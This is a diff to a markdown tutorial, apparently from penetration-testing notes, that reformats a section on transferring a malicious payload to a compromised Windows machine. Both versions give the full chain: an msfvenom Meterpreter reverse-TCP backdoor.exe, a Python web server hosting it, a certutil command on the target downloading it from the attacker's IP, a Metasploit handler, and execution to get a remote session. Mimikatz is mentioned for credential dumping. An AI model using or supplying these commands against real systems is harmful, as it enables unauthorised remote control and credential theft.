@@ -41,16 +41,16 @@ Options:<br>
 ## Example of trasferring malicious payload<br>
 ### Windows System
 We are in Post Explotation phase, so you need an initial access on the Target.  <br>
-I transferred a payload created by msfvenom, but you can transfer all files you need, like mimikatz.exe to perform credentials dumping, etc. <br><br>
-**Command to generate a malicious payload (reverse_tcp): msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f exe > 'backdoor.exe' (set LPORT and LHOST where you want to receive the connection. Default is x86, if need x64, you have to specify it) <br>**
-<img src="venompayload.png" width=85% height="auto"><br><br>
-**Setting up the web server: python3 -m http.server 80 <br>**
-<img src="python.png" width=70% height="auto"><br><br>
-**Download the payload with certutil: certutil -urlcache -f http://10.10.9.3/backdoor.exe <br>**
-<img src="certutil.png" width=60% height="auto"><br><br>
-**Use Metasploit to setting up a handler to listening the connections <br>**
-<img src="handler.png" width=50% height="auto"><br><br>
-**Execute the backdoor.exe on the Target and you got a Meterpreter Session on your Machine**
+I transferred a payload created by msfvenom, but you can transfer all files you need, like mimikatz.exe to perform credentials dumping, etc. <br>
+ - **Command to generate a malicious payload (reverse_tcp): msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f exe > 'backdoor.exe' <br>** (Set LPORT and LHOST to the values corresponding to the port and IP address of your computer, where you want to receive the connection from the attacked system. Default is x86, if need x64, you have to specify it) <br>
+<img src="venompayload.png" width=85% height="auto"><br>
+ - **Setting up the web server: python3 -m http.server 80 <br>**
+<img src="python.png" width=70% height="auto"><br>
+ - **Download the payload with certutil: certutil -urlcache -f http://10.10.9.3/backdoor.exe <br>**
+<img src="certutil.png" width=60% height="auto"><br>
+ - **Use Metasploit to setting up a handler to listening the connections <br>**
+<img src="handler.png" width=50% height="auto"><br>
+ - **Execute the backdoor.exe on the Target and you will have a Meterpreter Session on your Machine.**
 
 ### Linux System
 It's the same thing but u have to change the creation of payload and use another tool for download the file
